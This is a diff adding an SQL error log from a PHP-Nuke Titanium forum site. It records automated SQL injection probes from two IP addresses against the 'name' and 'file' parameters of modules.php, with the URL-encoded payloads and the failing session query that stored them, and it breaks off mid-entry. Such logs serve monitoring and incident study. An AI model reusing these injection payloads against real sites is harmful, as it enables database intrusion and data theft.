@@ -1,0 +1,494 @@
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:32] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&file=viewtopic&p=91">/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654072', 
+			'1670654072', 
+			'45.61.184.239', 
+			'3', 
+			'Forums AND 2673 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2673=2673) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(112)+CHAR(113)))', 
+			'/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:37] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20QJYv&file=viewtopic&p=91">/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20QJYv&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654077', 
+			'1670654077', 
+			'45.61.184.239', 
+			'3', 
+			'Forums AND 2673 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2673=2673) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(112)+CHAR(113)))-- QJYv', 
+			'/modules.php?name=Forums%20AND%202673%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282673%3D2673%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20QJYv&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:42] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%27%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27mMcE%27%3D%27mMcE&file=viewtopic&p=91">/modules.php?name=Forums%27%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27mMcE%27%3D%27mMcE&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'module' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654082', 
+			'1670654082', 
+			'45.61.184.239', 
+			'3', 
+			'Forums\') AND 5686=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5686=5686) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (\'mMcE\'=\'mMcE', 
+			'/modules.php?name=Forums%27%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27mMcE%27%3D%27mMcE&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:48] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%27%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27Ubmh%27%3D%27Ubmh&file=viewtopic&p=91">/modules.php?name=Forums%27%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27Ubmh%27%3D%27Ubmh&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654088', 
+			'1670654088', 
+			'45.61.184.239', 
+			'3', 
+			'Forums\' AND 5686=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5686=5686) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND \'Ubmh\'=\'Ubmh', 
+			'/modules.php?name=Forums%27%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27Ubmh%27%3D%27Ubmh&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:51] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287344%3D7344&file=viewtopic&p=91">/modules.php?name=Forums%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287344%3D7344&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654091', 
+			'1670654091', 
+			'45.61.184.239', 
+			'3', 
+			'Forums) AND 5686=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5686=5686) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (7344=7344', 
+			'/modules.php?name=Forums%29%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287344%3D7344&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:34:55] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&file=viewtopic&p=91">/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654095', 
+			'1670654095', 
+			'45.61.184.239', 
+			'3', 
+			'Forums AND 5686=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5686=5686) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)', 
+			'/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:35:01] - 
+User: 
+IP: 45.61.184.239
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20KSUU&file=viewtopic&p=91">/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20KSUU&file=viewtopic&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654101', 
+			'1670654101', 
+			'45.61.184.239', 
+			'3', 
+			'Forums AND 5686=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (5686=5686) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(112)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- KSUU', 
+			'/modules.php?name=Forums%20AND%205686%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285686%3D5686%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20KSUU&amp;file=viewtopic&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:36:54] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&p=91">/modules.php?name=Forums&file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654214', 
+			'1670654214', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:02] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20oIAB&p=91">/modules.php?name=Forums&file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20oIAB&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654222', 
+			'1670654222', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%20AND%208493%3DCAST%28%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288493%3D8493%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20oIAB&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:07] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%27%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27yjpa%27%3D%27yjpa&p=91">/modules.php?name=Forums&file=viewtopic%27%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27yjpa%27%3D%27yjpa&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654227', 
+			'1670654227', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%27%29%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27yjpa%27%3D%27yjpa&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:13] - 
+User: 
+IP: 185.146.232.168
+URL: <a href="http://www.php-nuke-titanium.86it.us/modules.php?name=Forums&file=viewtopic%27%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27wVhC%27%3D%27wVhC&p=91">/modules.php?name=Forums&file=viewtopic%27%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27wVhC%27%3D%27wVhC&p=91</a>
+
+File: /home/dev4/public_html/header.php
+Line: 438
+Message: Data too long for column 'url' at row 1
+Code: 1406
+Query: REPLACE INTO `nuke_session` (uname, 
+	                                                     time, 
+													starttime, 
+													host_addr, 
+													    guest, 
+													   module, 
+													      url) 
+	values ('Microsoft Corp', 
+	        '1670654233', 
+			'1670654233', 
+			'185.146.232.168', 
+			'3', 
+			'Forums', 
+			'/modules.php?name=Forums&amp;file=viewtopic%27%20AND%202338%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%282338%3D2338%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27wVhC%27%3D%27wVhC&amp;p=91');
+---------------------------------------------------------------------------------------------------------------------------------
+
+---------[SQL Error]------------------------------------------------------------------------------------------------------------
+- [10 Dec 2022 - 06:37:17] - 
+User: 
+IP: 185.146.232.168
